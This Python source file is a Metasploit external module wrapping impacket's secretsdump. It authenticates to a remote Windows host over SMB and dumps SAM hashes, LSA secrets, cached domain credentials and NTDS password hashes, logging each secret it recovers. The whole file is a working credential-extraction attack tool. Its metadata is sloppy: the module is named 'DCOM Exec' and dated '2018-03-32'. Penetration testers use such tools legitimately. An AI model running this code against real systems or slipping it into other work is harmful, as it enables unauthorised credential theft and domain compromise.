#!/usr/bin/env python
# Copyright (c) 2003-2018 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#

import codecs
import logging
import os
import sys
import traceback

try:
    from impacket import version
    from impacket.examples import logger
    from impacket.smbconnection import SMBConnection

    from impacket.examples.secretsdump import LocalOperations, \
        RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
except ImportError:
    dependencies_missing = True
else:
    dependencies_missing = False

import _msf_impacket
import metasploit.module as module

metadata = {
    'name': 'DCOM Exec',
    'description': '''
        Performs various techniques to dump hashes from the remote machine
        without executing any agent there. For SAM and LSA Secrets (including
        cached creds) we try to read as much as we can from the registry and
        then we save the hives in the target system (%SYSTEMROOT%\\Temp dir) and
        read the rest of the data from there.
     ''',
    'authors': ['Alberto Solino', 'Spencer McIntyre'],
    'date': '2018-03-32',
    'license': 'CORE_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://github.com/gentilkiwi/kekeo/tree/master/dcsync'},
        {'type': 'url', 'ref': 'http://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html'},
        {'type': 'url', 'ref': 'http://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html'},
        {'type': 'url', 'ref': 'http://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html'},
        {'type': 'url', 'ref': 'http://www.quarkslab.com/en-blog+read+13'},
        {'type': 'url', 'ref': 'https://code.google.com/p/creddump/'},
        {'type': 'url', 'ref': 'http://lab.mediaservice.net/code/cachedump.rb'},
        {'type': 'url', 'ref': 'http://insecurety.net/?p=768'},
        {'type': 'url', 'ref': 'http://www.beginningtoseethelight.org/ntsecurity/index.htm'},
        {'type': 'url', 'ref': 'http://www.ntdsxtract.com/downloads/ActiveDirectoryOfflineHashDumpAndForensics.pdf'},
        {'type': 'url', 'ref': 'http://www.passcape.com/index.php?section=blog&cmd=details&id=15'},
        {'type': 'url', 'ref': 'https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py'}
     ],
    'type': 'single_scanner',
    'options': {
        'ExecMethod': {'type': 'enum',   'description': 'The method to use for execution', 'required': True, 'default': 'smbexec', 'values': ['smbexec', 'wmiexec', 'mmcexec']},
        'OutputFile': {'type': 'string', 'description': 'Write the results to a file', 'required': False},
        'SMBDomain':  {'type': 'string', 'description': 'The Windows domain to use for authentication', 'required': False, 'default': '.'},
        'SMBPass':    {'type': 'string', 'description': 'The password for the specified username', 'required': True, 'default': None},
        'SMBUser':    {'type': 'string', 'description': 'The username to authenticate as', 'required': True, 'default': None},
    },
    'notes': {
        'AKA': ['secretsdump.py']
    }
}


class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', outputFile=None, execMethod='smbexec'):
        self.__useVSSMethod = False
        self.__remoteName = remoteName
        self.__remoteHost = remoteName
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__systemHive = None
        self.__securityHive = None
        self.__samHive = None
        self.__ntdsFile = None
        self.__history = False
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = outputFile
        self.__doKerberos = False
        self.__justDC = False
        self.__justDCNTLM = False
        self.__justUser = None
        self.__pwdLastSet = False
        self.__printUserStatus = False
        self.__resumeFileName = None
        self.__canProcessSAMLSA = True
        self.__kdcHost = None
        self.__execMethod = execMethod
        

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        try:
            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                self.__isRemote = False
                self.__useVSSMethod = True
                localOperations = LocalOperations(self.__systemHive)
                bootKey = localOperations.getBootKey()
                if self.__ntdsFile is not None:
                    # Let's grab target's configuration about LM Hashes storage
                    self.__noLMHash = localOperations.checkNoLMHashPolicy()
            else:
                self.__isRemote = True
                bootKey = None
                try:
                    try:
                        self.connect()
                    except:
                        if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help')
                            pass
                        else:
                            raise

                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                    self.__remoteOps.setExecMethod(self.__execMethod)
                    if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
                        self.__remoteOps.enableRegistry()
                        bootKey             = self.__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                except Exception as e:
                    self.__canProcessSAMLSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                        and self.__doKerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                    else:
                        logging.error('RemoteOperations failed: %s' % str(e))

            # If RemoteOperations succeeded, then we can extract SAM and LSA
            if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
                try:
                    if self.__isRemote is True:
                        SAMFileName         = self.__remoteOps.saveSAM()
                    else:
                        SAMFileName         = self.__samHive

                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote=self.__isRemote, perSecretCallback=self.perSecretCallback1)
                    self.__SAMHashes.dump()
                    if self.__outputFileName is not None:
                        self.__SAMHashes.export(self.__outputFileName)
                except Exception as e:
                    logging.error('SAM hashes extraction failed: %s' % str(e))

                try:
                    if self.__isRemote is True:
                        SECURITYFileName = self.__remoteOps.saveSECURITY()
                    else:
                        SECURITYFileName = self.__securityHive

                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                   isRemote=self.__isRemote, history=self.__history,
                                                   perSecretCallback=self.perSecretCallback2)
                    self.__LSASecrets.dumpCachedHashes()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportCached(self.__outputFileName)
                    self.__LSASecrets.dumpSecrets()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportSecrets(self.__outputFileName)
                except Exception as e:
                    logging.error('LSA hashes extraction failed: %s' % str(e), exc_info=True)

            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
            if self.__isRemote is True:
                if self.__useVSSMethod and self.__remoteOps is not None:
                    NTDSFileName = self.__remoteOps.saveNTDS()
                else:
                    NTDSFileName = None
            else:
                NTDSFileName = self.__ntdsFile

            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                           outputFileName=self.__outputFileName, justUser=self.__justUser,
                                           printUserStatus=self.__printUserStatus, perSecretCallback=self.perSecretCallback2)
            try:
                self.__NTDSHashes.dump()
            except Exception as e:
                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                    resumeFile = self.__NTDSHashes.getResumeSessionFile()
                    if resumeFile is not None:
                        os.unlink(resumeFile)
                logging.error(e, exc_info=True)
                if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
                    logging.info("You just got that error because there might be some duplicates of the same name. "
                                 "Try specifying the domain name for the user as well. It is important to specify it "
                                 "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
                elif self.__useVSSMethod is False:
                    logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
            self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            logging.error(e, exc_info=True)
            try:
                self.cleanup()
            except:
                pass

    def perSecretCallback1(self, secret):
        module.log(secret, 'good')

    def perSecretCallback2(self, secretType, secret):
        module.log(secret, 'good')

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()


def run(args):
    if dependencies_missing:
        module.log('Module dependencies (impacket) missing, cannot continue', level='error')
        return

    _msf_impacket.pre_run_hook(args)
    dumper = DumpSecrets(args['rhost'], args['SMBUser'], args['SMBPass'], args['SMBDomain'], args['OutputFile'], args['ExecMethod'])
    try:
        dumper.dump()
    except Exception as e:
        logging.error(e, exc_info=True)

if __name__ == "__main__":
    module.run(metadata, run)
